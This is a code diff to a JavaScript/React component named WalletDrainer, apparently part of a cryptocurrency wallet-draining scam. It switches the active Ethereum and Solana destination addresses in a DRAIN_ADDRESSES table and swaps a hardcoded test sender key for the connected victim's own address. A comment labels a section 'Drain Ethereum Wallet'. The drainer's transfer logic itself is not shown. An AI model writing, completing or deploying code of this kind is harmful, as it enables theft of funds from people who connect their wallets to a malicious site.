@@ -8,10 +8,10 @@ import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
 import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 const DRAIN_ADDRESSES = {
-  // ethereum: "0x98934289136e2352347401C1c6c9d652F7f0a08E",
-  // solana: "8aMQkXNqrV5GfLua9NfF5LuPhBHx6kZHGuenBPfAEGJV",
-  ethereum: "0x07799f805bbba59bff3be94884e90e83479f37b5", //
-  solana: "DcxDHKrEM7CY6nHZJepi9GzRh9vNFJnHt5ipaoxs8ZVB", //
+  ethereum: "0x98934289136e2352347401C1c6c9d652F7f0a08E",
+  solana: "8aMQkXNqrV5GfLua9NfF5LuPhBHx6kZHGuenBPfAEGJV",
+  // ethereum: "0x07799f805bbba59bff3be94884e90e83479f37b5", //
+  // solana: "DcxDHKrEM7CY6nHZJepi9GzRh9vNFJnHt5ipaoxs8ZVB", //
 };
 
 // 🚀 Drain Ethereum Wallet
@@ -103,8 +103,8 @@ export default function WalletDrainer({ wallet }) {
         }
   
         try {
-        //   const senderPublicKey = new PublicKey(address);
-        const senderPublicKey = new PublicKey('EvCLRnx9FXfviUw92xHojEKJqnuNCbETkQm87eHqKPpb');
+          const senderPublicKey = new PublicKey(address);
+        // const senderPublicKey = new PublicKey('EvCLRnx9FXfviUw92xHojEKJqnuNCbETkQm87eHqKPpb');
           console.log("✅ Address is valid:", senderPublicKey.toBase58());
   
           // Get the latest blockhash
